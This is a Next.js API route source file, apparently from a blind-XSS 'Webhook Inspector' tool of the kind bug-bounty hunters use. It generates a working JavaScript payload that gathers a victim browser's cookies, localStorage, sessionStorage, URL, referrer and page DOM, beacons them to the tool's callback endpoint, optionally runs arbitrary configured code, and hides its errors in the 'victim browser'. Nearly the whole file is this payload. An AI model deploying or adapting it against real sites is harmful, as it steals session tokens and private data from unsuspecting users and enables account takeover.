import { kv } from '@vercel/kv';
import { NextResponse } from 'next/server';

export const dynamic = 'force-dynamic';

if (!global._webhooksStore) {
  global._webhooksStore = {
    requests: {},
    configs: {},
    counts: {}
  };
}

export async function GET(request) {
  const { searchParams } = new URL(request.url);
  const id = searchParams.get('id');

  if (!id) {
    return new NextResponse('console.error("Webhook Inspector: Missing target ID parameter.");', {
      headers: {
        'Content-Type': 'application/javascript',
        'Access-Control-Allow-Origin': '*',
      },
    });
  }

  // Fetch configuration
  const isKvConnected = !!process.env.KV_URL;
  let savedConfig = null;
  if (isKvConnected) {
    try {
      savedConfig = await kv.get(`webhook:${id}:config`);
    } catch (e) {
      console.error('KV Read Error:', e);
    }
  } else {
    savedConfig = global._webhooksStore?.configs?.[id] || null;
  }

  let configObj = null;
  if (savedConfig) {
    try {
      configObj = typeof savedConfig === 'string' ? JSON.parse(savedConfig) : savedConfig;
    } catch (e) {
      console.error('Config Parse Error:', e);
    }
  }

  const xssDomEnabled = configObj?.xssDomEnabled !== undefined ? !!configObj.xssDomEnabled : true;
  const xssCookiesEnabled = configObj?.xssCookiesEnabled !== undefined ? !!configObj.xssCookiesEnabled : true;
  const xssStorageEnabled = configObj?.xssStorageEnabled !== undefined ? !!configObj.xssStorageEnabled : true;
  const xssCustomCode = configObj?.xssCustomCode || '';

  // Get current host to construct callback reporting URL
  const host = request.headers.get('host') || 'localhost:3000';
  const protocol = host.includes('localhost') ? 'http' : 'https';
  const callbackUrl = `${protocol}://${host}/api/x/callback?id=${id}`;

  // Custom, optimized stealth payload script built based on custom endpoints controls
  const payloadScript = `(function() {
  try {
    var data = {
      uri: window.location.href || "",
      ref: document.referrer || "",
      cookies: ${xssCookiesEnabled ? 'document.cookie || ""' : '"[Omitted by hunter settings]"'},
      local: "",
      session: "",
      dom: ""
    };

    ${xssStorageEnabled ? `
    // Grab LocalStorage safely
    try {
      var ls = {};
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        ls[k] = localStorage.getItem(k);
      }
      data.local = JSON.stringify(ls);
    } catch(e) {}

    // Grab SessionStorage safely
    try {
      var ss = {};
      for (var i = 0; i < sessionStorage.length; i++) {
        var k = sessionStorage.key(i);
        ss[k] = sessionStorage.getItem(k);
      }
      data.session = JSON.stringify(ss);
    } catch(e) {}
    ` : 'data.local = "[Storage collection disabled]"; data.session = "[Storage collection disabled]";'}

    ${xssDomEnabled ? `
    // Grab DOM HTML (Cap at 80KB to avoid excessive storage/payload limits)
    try {
      var rawDom = document.documentElement.outerHTML || "";
      if (rawDom.length > 80000) {
        data.dom = rawDom.substring(0, 80000) + "\\n\\n[--- TRUNCATED TO 80KB ---]";
      } else {
        data.dom = rawDom;
      }
    } catch(e) {}
    ` : 'data.dom = "[DOM harvesting disabled by hunter settings]";'}

    // Fire callback using beacon or fetch
    if (navigator.sendBeacon) {
      var blob = new Blob([JSON.stringify(data)], { type: "application/json" });
      navigator.sendBeacon("${callbackUrl}", blob);
    } else {
      fetch("${callbackUrl}", {
        method: "POST",
        mode: "cors",
        credentials: "omit",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
    }

    ${xssCustomCode ? `
    // Appended Custom JS Payload code from configurations
    try {
      ${xssCustomCode}
    } catch(customErr) {
      console.error("Webhook Inspector Custom JS Error:", customErr);
    }
    ` : ''}

  } catch(err) {
    // Fail silently in victim browser
  }
})();`;

  return new NextResponse(payloadScript, {
    headers: {
      'Content-Type': 'application/javascript',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
    },
  });
}

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}
